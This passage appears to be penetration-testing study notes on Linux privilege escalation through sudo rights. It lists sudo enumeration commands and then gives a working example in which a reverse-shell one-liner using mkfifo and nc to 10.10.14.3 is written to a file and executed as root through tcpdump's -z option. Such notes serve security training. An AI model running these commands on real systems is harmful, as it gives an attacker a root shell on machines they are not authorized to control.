
```sh
sudo -l ### check privileges for NOPASSWD options

cat /etc/sudoers ### check privileges 
```

---
## Rights Abuse Example

```sh
> man tcpdump 

	<SNIP> 
	-z postrotate-command
```

By specifying the `-z` flag, an attacker could use `tcpdump` to execute a shell script.

```sh
echo 'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.3 443 >/tmp/f' > /tmp/.test

sudo /usr/sbin/tcpdump -ln -i ens192 -w /dev/null -W 1 -G 1 -z /tmp/.test -Z root
```

---